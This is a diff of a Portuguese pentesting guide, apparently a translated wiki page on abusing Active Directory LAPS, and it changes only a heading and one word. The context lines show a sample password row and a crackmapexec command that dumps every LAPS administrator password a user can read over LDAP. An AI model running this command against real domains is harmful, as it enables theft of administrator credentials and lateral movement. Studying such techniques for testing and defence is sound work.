@@ -83,13 +83,13 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## **Extraindo Senhas LAPS Com Crackmapexec**
+## **Dumpando Senhas LAPS Com Crackmapexec**
 
 Se não houver acesso a um powershell, você pode abusar desse privilégio remotamente através do LDAP usando
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
-Isso irá despejar todas as senhas que o usuário pode ler, permitindo que você obtenha uma melhor base com um usuário diferente.
+Isso irá despejar todas as senhas que o usuário pode ler, permitindo que você obtenha uma melhor posição com um usuário diferente.
 
 ## ** Usando a Senha LAPS **
 ```
